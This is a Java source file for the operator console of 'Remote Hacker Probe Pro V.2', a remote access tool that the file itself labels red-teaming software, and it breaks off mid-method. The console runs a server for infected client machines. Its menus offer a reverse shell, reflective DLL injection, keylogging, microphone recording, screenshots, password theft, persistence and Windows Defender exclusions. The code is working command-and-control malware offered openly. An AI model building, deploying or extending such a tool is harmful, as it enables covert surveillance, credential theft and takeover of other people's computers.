package rhp;

import java.awt.EventQueue;

import javax.swing.JFrame;

import com.github.weisj.darklaf.LafManager;
import com.github.weisj.darklaf.settings.ThemeSettings;
import com.github.weisj.darklaf.theme.DarculaTheme;
import com.github.weisj.darklaf.theme.IntelliJTheme;
import com.github.weisj.darklaf.theme.SolarizedDarkTheme;
import com.github.weisj.darklaf.theme.SolarizedLightTheme;
import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;

import javax.swing.JLabel;
import java.awt.Font;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.concurrent.TimeUnit;

import javax.swing.JToggleButton;
import javax.swing.UIManager;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JFileChooser;

import java.awt.Window.Type;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.JTextArea;

import java.awt.Color;
import java.awt.Component;
import java.awt.Cursor;
import javax.swing.JTable;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.tools.DocumentationTool.Location;

import org.apache.commons.codec.binary.StringUtils;

import com.maxmind.geoip2.record.*;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JTabbedPane;
import javax.swing.JPanel;
import javax.swing.JMenuBar;

public class MainWindow {

	public static JFrame frmRemoteHackerProbe;
	public static DefaultTableModel model = new DefaultTableModel() {

	    @Override
	    public boolean isCellEditable(int row, int column) {
	       return false;
	    }
	};
	
	public static DefaultTableModel dlModel = new DefaultTableModel() {

	    @Override
	    public boolean isCellEditable(int row, int column) {
	       return false;
	    }
	};
	
	public static DefaultTableModel loaderModel = new DefaultTableModel() {

	    @Override
	    public boolean isCellEditable(int row, int column) {
	       return false;
	    }
	};
	
	public static JTabbedPane tabbedPane;
	static JTextArea LogArea = new JTextArea();
	public static JLabel onlinelabel = new JLabel("");
	static JLabel userlbl = new JLabel("User : ");
	public static JTable table;
	public static JTable loaderTable;
	public static JTable dlTable;
	private JTable LoaderPane;

	/**
	 * Launch the application.
	 */
	
	public static String GetClientType(int INDEX) {
		return Server.RHPPATHS.get(INDEX);
	}
	public static Double GetLatitude(int CLIENT_ID)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip = Server.WANIP.get(CLIENT_ID);	
	    DatabaseReader dbReader;
	    File database1 = new File(dbLocation);
	    DatabaseReader reader;
		try {
			reader = new DatabaseReader.Builder(database1).build();
			InetAddress ipAddress = InetAddress.getByName(ip);
		    CityResponse response;
			try {
				response = reader.city(ipAddress);
				com.maxmind.geoip2.record.Location location = response.getLocation();
			    return location.getLatitude();
			} catch (GeoIp2Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}
	
	public static Double GetLongitude(int CLIENT_ID)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip = Server.WANIP.get(CLIENT_ID);
	    DatabaseReader dbReader;
	    File database1 = new File(dbLocation);
	    DatabaseReader reader;
		try {
			reader = new DatabaseReader.Builder(database1).build();
			InetAddress ipAddress = InetAddress.getByName(ip);
		    CityResponse response;
			try {
				response = reader.city(ipAddress);
				com.maxmind.geoip2.record.Location location = response.getLocation();
			    return location.getLongitude();
			} catch (GeoIp2Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}
	
	public static void setUIFont (javax.swing.plaf.FontUIResource f){
	    java.util.Enumeration keys = UIManager.getDefaults().keys();
	    while (keys.hasMoreElements()) {
	      Object key = keys.nextElement();
	      Object value = UIManager.get (key);
	      if (value instanceof javax.swing.plaf.FontUIResource)
	        UIManager.put (key, f);
	      }
	    } 
	
	
	public static void HaltAllSystems()
	{
		
		//table.getSelectionModel().clearSelection();
		table.setEnabled(false); // Disable the Main Table too!
		loaderTable.setEnabled(false);
	}
	
	public static void EnableAllSystems()
	{
		table.setEnabled(true); // Enable the Main Table too!
		loaderTable.setEnabled(true);
	}
	
	public static void Log(String text)
	{
		String timeStamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
		LogArea.append("["+ Settings.userSetting("username") + "@" +timeStamp+"] " + text + "\n");		
	}
	
	
	
	 static void UpdateTabTitles() {
		
		int probesz = Server.Clients.size();
		int loadersz = Server.LoaderClients.size();
		String probeclStr = "Connected Probes (" + probesz + ")";
		String loaderStr = "Reflective Loader Handler (" + loadersz + ")";
 		tabbedPane.setTitleAt(0, probeclStr);
		tabbedPane.setTitleAt(1, loaderStr);
	}
	
	public static void UpdateOnlineLabel()
	{
		String sz = String.valueOf( Server.Clients.size() + Server.LoaderClients.size() );
		String label = "Online : " + sz;
		onlinelabel.setText(label);
		UpdateTabTitles();
	}
	public static void SaveTheme(String Theme)
	{
		try {
			Settings.changeProperty("rhp.ini", "theme", Theme.replaceAll("\\s+", ""));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static void UpdateTheme()
	{
		String themeName = Settings.returnSetting("theme");
		if(themeName.equals("Dark")) {
			LafManager.install(new DarculaTheme());
		} else if(themeName.equals("Light")) {
			LafManager.install(new IntelliJTheme());
		} else if(themeName.equals("SolarizedDark")) {
			LafManager.install(new SolarizedDarkTheme());
		} else if(themeName.equals("SolarizedLight")) {
			LafManager.install(new SolarizedLightTheme());
		} else {
			LafManager.install(new IntelliJTheme());
		}
		
		ThemeSettings settings = ThemeSettings.getInstance();

		settings.refresh();
	}
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					
					UpdateTheme();
				
					UIManager.put("OptionPane.messageFont", new Font("Calibri", Font.PLAIN, 12));
					UIManager.put("OptionPane.buttonFont", new Font("Calibri", Font.PLAIN, 12));
					
					String usrlbltxt = Settings.userSetting("username");
					setUIFont (new javax.swing.plaf.FontUIResource("Calibri",Font.PLAIN,13));
					
					if(usrlbltxt.equals("FILE_NOT_FOUND"))
					{
						Register dialog = new Register();
						dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
						dialog.setVisible(true);
					} else {
						Register.CheckUserValidity();
						
						MainWindow window = new MainWindow();
						window.frmRemoteHackerProbe.setVisible(true);
						userlbl.setText("User : " + Settings.userSetting("username"));
						UpdateOnlineLabel();
					}

					
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}
	
	public static int ClientIndex(Socket sock)
	{
		int out;
		if(Server.Clients.contains(sock))
		{
			// this is a Probe Client
			out = Server.Clients.indexOf(sock);
		} else {
			// Reflective Probe
			out = Server.LoaderClients.indexOf(sock);
		}
		
		return out;
	}

	/**
	 * Create the application.
	 */
	
	
	public MainWindow() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	
	private void initialize() {
		// Start the server
		Server srv = new Server();
		srv.server_host = Settings.returnSetting("host");
		srv.server_port = Integer.parseInt(Settings.returnSetting("port"));
		srv.tcpserver.start();
		Log("Remote Hacker Probe Pro Started.");
		
		frmRemoteHackerProbe = new JFrame();
		frmRemoteHackerProbe.setTitle("Remote Hacker Probe Pro V.2");
		frmRemoteHackerProbe.setBounds(100, 100, 859, 502);
		frmRemoteHackerProbe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		
		tabbedPane = new JTabbedPane(JTabbedPane.TOP); // Create JTabbedPane
	    
		
		
		JMenuBar menuBar = new JMenuBar();
		frmRemoteHackerProbe.setJMenuBar(menuBar);
		
		JMenu mnNewMenu = new JMenu("Remote Hacker Probe Pro");
		menuBar.add(mnNewMenu);
		
		JMenuItem mntmNewMenuItem_2 = new JMenuItem("Re Authenticate");
		mntmNewMenuItem_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int x = JOptionPane.showConfirmDialog(null, "Are you sure you want to Re authenticate?", "Remote Hacker Probe Pro | Re Authenticate", JOptionPane.YES_NO_OPTION);
				if(x == JOptionPane.YES_OPTION) {
					File f =  new File("user.ini");
					f.delete();
					JOptionPane.showMessageDialog(null, "Restart Remote Hacker Probe Pro.");
					System.exit(0);
				}
				
			}
		});
		mnNewMenu.add(mntmNewMenuItem_2);
		
		JMenuItem mntmNewMenuItem = new JMenuItem("Exit");
		mntmNewMenuItem.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				System.exit(0);
			}
		});
		
		JMenuItem mntmNewMenuItem_1 = new JMenuItem("Settings");
		mntmNewMenuItem_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Settings s = new Settings();
				s.setVisible(true);
			}
		});
		mnNewMenu.add(mntmNewMenuItem_1);
		
		JMenuItem abt = new JMenuItem("About");
		abt.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JOptionPane.showMessageDialog(frmRemoteHackerProbe,
						"Remote Hacker Probe Pro - Help"
						+ "\nRemote Hacker Probe Pro is a Threat Emulation and Red Teaming Software.\r\n"
						+ "\r\n"
						+ "Created By : QuantumCore"
						+ "\nFor more information visit : https://quantumcored.com/rhp/");
			}
		});
		mnNewMenu.add(abt);
		
		JMenuItem mntmNewMenuItem_5 = new JMenuItem("* Whats new?");
		mntmNewMenuItem_5.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JOptionPane.showMessageDialog(null, "Changes in V.2\n"
						+ "\n- Added File Menu."
						+ "\n- GUI Updated!"
						+ "\n- Added Reflective Loader Payload."
						+ "\n- Added Reflective Probe DLL."
						+ "\n- Added Message Box DLL for Testing."
						+ "\n- Added OPEN URL DLL for Testing."
						+ "\n- Reflective Loader Build added."
						+ "\n- Added ELEVATION DLL Payload."
						+ "\n- Added Ability to add Windows Defender Exclusions. (requires UAC)"
						+ "\n- Added Ability to view Windows Defender Exclusions. (requires UAC)"
						+ "\n- Added new UAC Column in Main table."
						+ "\n- Reflective DLL Injection Improved, Now you can read Output too, Giving full power to run anything in memory."
						+ "\n- Added Downloads TAB."
						+ "\n- Downloaded Files will now be saved under 'downloads' folder and Downloaded Screenshots under 'screenshots'."
						+ "\n- Some icons were removed to speed up RHP."
						);
			}
		});
		mnNewMenu.add(mntmNewMenuItem_5);
		mnNewMenu.add(mntmNewMenuItem);
		
		JMenu mnNewMenu_1 = new JMenu("Probe");
		menuBar.add(mnNewMenu_1);
		
		JMenuItem mntmNewMenuItem_3 = new JMenuItem("Build Probe");
		mntmNewMenuItem_3.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Builder b = new Builder(); 
	    		b.setVisible(true);
			}
		});
		mnNewMenu_1.add(mntmNewMenuItem_3);
		
		JMenuItem mntmNewMenuItem_4 = new JMenuItem("Custom Probe");
		mntmNewMenuItem_4.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JOptionPane.showMessageDialog(frmRemoteHackerProbe, "Coming soon!");
			}
		});
		mnNewMenu_1.add(mntmNewMenuItem_4);
		
		JMenuBar menuBar_1 = new JMenuBar();
		menuBar.add(menuBar_1);
		
		JLabel heading = new JLabel("Remote Hacker Probe Pro");
		heading.setFont(new Font("Calibri", Font.PLAIN, 15));
	
		
		userlbl.setForeground(new Color(65, 105, 225));
		userlbl.setFont(new Font("Calibri", Font.BOLD, 14));
		
		
		
		onlinelabel = new JLabel("Online");
		onlinelabel.setToolTipText("Online Clients");
		onlinelabel.setFont(new Font("Calibri", Font.PLAIN, 12));
		LogArea.setEditable(false);
		
		LogArea.setCursor(Cursor.getPredefinedCursor(Cursor.TEXT_CURSOR));
		LogArea.setToolTipText("Logs");
		LogArea.setFont(new Font("Consolas", Font.BOLD, 12));
		
		JScrollPane sp = new JScrollPane(LogArea);
		sp.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		sp.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
		
		JButton clearLogs = new JButton("Clear Logs");
		clearLogs.setToolTipText("Clear logs.");
		clearLogs.setFont(new Font("Calibri", Font.PLAIN, 12));
		clearLogs.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int result = JOptionPane.showConfirmDialog(frmRemoteHackerProbe, "Are you sure you want to clear logs?",
				        "Clear Logs", JOptionPane.OK_CANCEL_OPTION);
				if(result == JOptionPane.YES_OPTION) {
					LogArea.setText("");
				}
			}
		});
	    
	    JButton exportLog = new JButton("Export Logs");
	    exportLog.setToolTipText("Export logs to a file.");
	    exportLog.setFont(new Font("Calibri", Font.PLAIN, 12));
	    exportLog.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		JFileChooser fileChooser = new JFileChooser();
	    		if (fileChooser.showSaveDialog(frmRemoteHackerProbe) == JFileChooser.APPROVE_OPTION) {
	    		  File file = fileChooser.getSelectedFile();
	    		  FileWriter wt;
					try {
						wt = new FileWriter(file, true);
						wt.write(LogArea.getText());
						wt.close();
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
	    		}
	    	}
	    });

	    
	    
	    GroupLayout groupLayout = new GroupLayout(frmRemoteHackerProbe.getContentPane());
	    groupLayout.setHorizontalGroup(
	    	groupLayout.createParallelGroup(Alignment.LEADING)
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addContainerGap()
	    			.addComponent(heading, GroupLayout.PREFERRED_SIZE, 207, GroupLayout.PREFERRED_SIZE)
	    			.addContainerGap(626, Short.MAX_VALUE))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(10)
	    			.addComponent(onlinelabel, GroupLayout.DEFAULT_SIZE, 323, Short.MAX_VALUE)
	    			.addGap(510))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addContainerGap()
	    			.addComponent(userlbl, GroupLayout.PREFERRED_SIZE, 412, GroupLayout.PREFERRED_SIZE)
	    			.addPreferredGap(ComponentPlacement.RELATED, 190, Short.MAX_VALUE)
	    			.addComponent(exportLog, GroupLayout.PREFERRED_SIZE, 106, GroupLayout.PREFERRED_SIZE)
	    			.addPreferredGap(ComponentPlacement.UNRELATED)
	    			.addComponent(clearLogs, GroupLayout.PREFERRED_SIZE, 105, GroupLayout.PREFERRED_SIZE)
	    			.addContainerGap())
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(10)
	    			.addComponent(sp, GroupLayout.DEFAULT_SIZE, 823, Short.MAX_VALUE)
	    			.addGap(10))
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addContainerGap()
	    			.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 823, Short.MAX_VALUE)
	    			.addContainerGap())
	    );
	    groupLayout.setVerticalGroup(
	    	groupLayout.createParallelGroup(Alignment.LEADING)
	    		.addGroup(groupLayout.createSequentialGroup()
	    			.addGap(11)
	    			.addComponent(heading, GroupLayout.PREFERRED_SIZE, 21, GroupLayout.PREFERRED_SIZE)
	    			.addGap(11)
	    			.addComponent(onlinelabel, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE)
	    			.addGap(11)
	    			.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 240, Short.MAX_VALUE)
	    			.addGap(18)
	    			.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
	    				.addComponent(clearLogs)
	    				.addComponent(exportLog)
	    				.addComponent(userlbl))
	    			.addGap(11)
	    			.addComponent(sp, GroupLayout.DEFAULT_SIZE, 68, Short.MAX_VALUE)
	    			.addGap(11))
	    );
	    
	    JPanel panel = new JPanel();
	    tabbedPane.addTab("Connected Probes", null, panel, null);
	    
	    table = new JTable(model);
		DefaultTableCellRenderer centerRenderer = new DefaultTableCellRenderer();
		centerRenderer.setHorizontalAlignment( JLabel.CENTER );
	    JScrollPane tablescroll = new JScrollPane(table);
	    tablescroll.setToolTipText("Online Clients appear here");
	    GroupLayout gl_panel = new GroupLayout(panel);
	    gl_panel.setHorizontalGroup(
	    	gl_panel.createParallelGroup(Alignment.LEADING)
	    		.addComponent(tablescroll, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 476, Short.MAX_VALUE)
	    );
	    gl_panel.setVerticalGroup(
	    	gl_panel.createParallelGroup(Alignment.LEADING)
	    		.addComponent(tablescroll, GroupLayout.DEFAULT_SIZE, 241, Short.MAX_VALUE)
	    );
	    panel.setLayout(gl_panel);
	    
	    
		model.addColumn("ID");
		model.addColumn("Client Type");
		model.addColumn("Path on disk");
		model.addColumn("IP Address");
		model.addColumn("Port");
		 
		model.addColumn("Username");
		model.addColumn("Hostname");
		model.addColumn("OS");
		model.addColumn("Public IP");
		model.addColumn("Country");
		model.addColumn("UAC");
		
		JPopupMenu popupMenu = new JPopupMenu();
	    
	    JMenuItem shell = new JMenuItem(" Reverse Shell" );
	    shell.setFont(new Font("Calibri", Font.PLAIN, 13));
	    shell.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Shell rshell = new Shell();
					int index = table.getSelectedRow();
					rshell.CLIENTSOCKET = Server.Clients.get(index); // 
					rshell.interact.setText("Reverse Shell for Client ID : " + String.valueOf(index) + " @ " + Server.UserPC.get(index) + " running " + Server.OperatingSystem.get(index));
					Log("Accessing Reverse Shell for Client ID : " + String.valueOf(index));
					rshell.setVisible(true);	
				}
			}
	    });
	    
	    
	    JMenuItem execpayload = new JMenuItem(" Reflective DLL Injection" );
	    execpayload.setFont(new Font("Calibri", Font.PLAIN, 13));
	    execpayload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {	
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					ReflectiveDLLInjection rfWindow = new ReflectiveDLLInjection();
					int index = table.getSelectedRow();
					rfWindow.CLIENTSOCKET = Server.Clients.get(index);
					rfWindow.infoLbl.setText("for Client ID " + String.valueOf(index) + " " +Server.UserPC.get(index));
					ReflectiveDLLInjection.s.setText("");
					rfWindow.setVisible(true);
				}
			}
		});
	    JMenuItem unis = new JMenuItem(" Disconnect" );
	    unis.setFont(new Font("Calibri", Font.PLAIN, 13));
	    unis.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int index = table.getSelectedRow(); 
				Server.SendData(Server.Clients.get(index), "kill");
				ServerThread s = new ServerThread(Server.Clients.get(index), "Probe Client"); s.clear();
				Log("Connection Closed for Client ID : " + String.valueOf(index));
			}
				
		});
	    
	    JMenuItem ss = new JMenuItem(" Take Screenshot" );
	    ss.setFont(new Font("Calibri", Font.PLAIN, 13));
	    ss.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
	    			Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "screenshot");
					ServerThread.WaitForReply();
					Log("Taking Screenshot of Client ID : " + String.valueOf(index));
				}
				
			}
		});
	    
	    JMenuItem mic = new JMenuItem(" Record Mic" );
	    mic.setFont(new Font("Calibri", Font.PLAIN, 13));
	    mic.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
	    			Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					MicRecorder mc = new MicRecorder();
					MicRecorder.CLIENT_ID = index;
					mc.setVisible(true);
				}
			}
		});
	    
	    
	    
	    JMenuItem filemgr = new JMenuItem(" File Manager");
	    filemgr.setFont(new Font("Calibri", Font.PLAIN, 13));
	    filemgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Log("Accessing File Manager for Client ID : " + String.valueOf(table.getSelectedRow()));
					// Get The Drives
					Server.SendData(Server.Clients.get(index), "drives");
					ServerThread.WaitForReply();
					FileManager dialog = new FileManager();
					dialog.CLIENT_ID = table.getSelectedRow(); 
					dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					dialog.setVisible(true);
				}
			}
		});
	   
	    JMenuItem network_scanner = new JMenuItem(" Network Scanner" );
	    network_scanner.setFont(new Font("Calibri", Font.PLAIN, 13));
	    network_scanner.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					NetworkScanner ns = new NetworkScanner();
					ns.CLIENT_ID = table.getSelectedRow(); 
					ns.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					
					ns.setVisible(true);
				}
				
			}
	    	
	    });
	    JMenuItem geolocate = new JMenuItem(" Geolocate" );
	    geolocate.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Map m = new Map();
					m.CLIENT_ID = table.getSelectedRow(); 
					m.isProbe = true;
					m.UpdateMapInfo();
					m.setVisible(true);
				}
			}
		});
	    geolocate.setFont(new Font("Calibri", Font.PLAIN, 13));
	   
	    
	    
	    JMenuItem shutdown = new JMenuItem(" Shut down");
	    shutdown.setFont(new Font("Calibri", Font.PLAIN, 13));
	    shutdown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "poweroff");
					ServerThread.WaitForReply();
					Log("Shutting Down Client ID : " + String.valueOf(index));
				}
			}
		});
	    

	    JMenuItem restart = new JMenuItem(" Restart" );
	    restart.setFont(new Font("Calibri", Font.PLAIN, 13));
	    restart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "restart");
					ServerThread.WaitForReply();	
					Log("Restarting Client ID : " + String.valueOf(index));
				}
			}
		});
	    
	    
	    JMenuItem persist = new JMenuItem(" Persist" );
	    persist.setFont(new Font("Calibri", Font.PLAIN, 13));
	    persist.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Persist ps = new Persist();
					ps.CLIENT_ID = index;
					ps.username = Server.UserPC.get(index).replace(" ", "").split("/")[0];
					ps.setVisible(true);
				}
			}
		});
	    
	    JMenuItem msgbox = new JMenuItem(" Message box" );
	    msgbox.setFont(new Font("Calibri", Font.PLAIN, 13));
	    msgbox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					MsgBox dialog = new MsgBox();
					MsgBox.CLIENT_ID = table.getSelectedRow(); 
					dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
					dialog.setVisible(true);
				}
			}
		});
	    
	    JMenuItem openurl = new JMenuItem(" Open URL" );
	    openurl.setFont(new Font("Calibri", Font.PLAIN, 13));
	    openurl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					String url = JOptionPane.showInputDialog("Enter URL (http/https) :  ");
					if(url.startsWith("http"))
					{
						Server.SendData(Server.Clients.get(index), "openurl="+url);
						ServerThread.WaitForReply();
						Log("Opening url '" + url + "' on Client ID : " + String.valueOf(index));
					} else {
						JOptionPane.showMessageDialog(null, "URL must start with http/https.");
					}
				}
			}
		});
	    
	    JMenuItem keylog = new JMenuItem(" Keylogger" );
	    keylog.setFont(new Font("Calibri", Font.PLAIN, 13));
	    keylog.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Keylogger.getKeylogs = true;
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "kls");
					ServerThread.WaitForReply();
				}
			}
		});
	    
	    JMenuItem taskmgr = new JMenuItem(" Task Manager" );
	    taskmgr.setFont(new Font("Calibri", Font.PLAIN, 13));
	    taskmgr.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					Server.SendData(Server.Clients.get(index), "taskls");
					ServerThread.WaitForReply();
					TaskMgr mgr = new TaskMgr(0);
					TaskMgr.CID = index;
					mgr.setVisible(true);
				}
			}
		});
	    
	    JMenuItem pwrecover = new JMenuItem(" Password Recovery" );
	    pwrecover.setFont(new Font("Calibri", Font.PLAIN, 13));
	    pwrecover.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(table.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					int index = table.getSelectedRow(); 
					PwRecover.host = Server.UserPC.get(index);
					Server.SendData(Server.Clients.get(index), "passcat");
					ServerThread.WaitForReply();
					
					PwRecover pw = new PwRecover();
					pw.setVisible(true);
				}
			}
		});

	    
	    JMenu systemstuff = new JMenu(" System ");
	    systemstuff.setIcon(new ImageIcon("icons/032-profile.png"));
	    systemstuff.setFont(new Font("Calibri", Font.PLAIN, 13));
	    
		JMenu surveillance = new JMenu(" Surveillance ");
		surveillance.setFont(new Font("Calibri", Font.PLAIN, 13));
		surveillance.setIcon(new ImageIcon("icons/050-vision.png"));

		JMenu infogather = new JMenu(" Information Gathering ");
		infogather.setFont(new Font("Calibri", Font.PLAIN, 13));
		infogather.setIcon(new ImageIcon("icons/041-statistics.png"));
		
		JMenu pcpower = new JMenu(" Computer Power ");
		pcpower.setFont(new Font("Calibri", Font.PLAIN, 13));
		pcpower.setIcon(new ImageIcon("icons/031-power.png"));
		
		JMenu fun = new JMenu(" Miscellaneous ");
		fun.setFont(new Font("Calibri", Font.PLAIN, 13));
		fun.setIcon(new ImageIcon("icons/033-rating.png"));
		
		JMenu client = new JMenu(" Client ");
		client.setFont(new Font("Calibri", Font.PLAIN, 13));
		client.setIcon(new ImageIcon("icons/038-gear.png"));
		

		
		systemstuff.add(filemgr);
		systemstuff.add(shell);
		systemstuff.add(execpayload);
		systemstuff.add(taskmgr);

	    infogather.add(network_scanner);
	    infogather.add(geolocate);
	    infogather.add(pwrecover);
	    
	    surveillance.add(ss);
	    surveillance.add(mic);
	    surveillance.add(keylog);
	    

	    pcpower.add(shutdown);
	    pcpower.add(restart);
	    
	    client.add(unis);
	    client.add(persist);

	    
	    fun.add(msgbox);
	    fun.add(openurl);
	    
	    
	    popupMenu.add(systemstuff);
	    popupMenu.add(surveillance);
	    popupMenu.add(infogather);
	    popupMenu.add(pcpower);
	    popupMenu.add(fun);
	    popupMenu.add(client);
	    

	    
	    addPopup(table, popupMenu);
	    
	    
	    // ======================================================================================
	    JPanel panel_2 = new JPanel();
	    tabbedPane.addTab("Reflective Loader Handler", null, panel_2, null);
	    
	    JPopupMenu DLL_Loader = new JPopupMenu();
	    JMenuItem probeClient = new JMenuItem(" Load Reflective Probe" );
	    probeClient.setFont(new Font("Calibri", Font.PLAIN, 13));
	    probeClient.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow();
					Socket CLIENTSOCKET = Server.LoaderClients.get(index);
					String host = JOptionPane.showInputDialog("Enter Host : ");
					String port = JOptionPane.showInputDialog("Enter Port : ");
					if(host.length() > 0 && port.length() > 0)
					{						
						
						HaltAllSystems();
						MainWindow.Log("Loading Reflective Probe on Loader ID : " + String.valueOf(index));
						File rprobe = new File("payloads/ReflectiveProbe.dll");
						ReflectiveDLLInjection.DLLInject(rprobe, false, "REFLECTIVE_PROBE", host+":"+port, CLIENTSOCKET, false, "0");
						EnableAllSystems();
						
						Server.SendData(Server.LoaderClients.get(index), "kill");
						ServerThread s = new ServerThread(Server.LoaderClients.get(index), "DLL Loader"); s.clear();
						
					}	
				}
			}
			
		});
	    
	    JMenuItem discon = new JMenuItem(" Disconnect" );
	    discon.setFont(new Font("Calibri", Font.PLAIN, 13));
	    discon.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int index = loaderTable.getSelectedRow(); 
				Server.SendData(Server.LoaderClients.get(index), "kill");
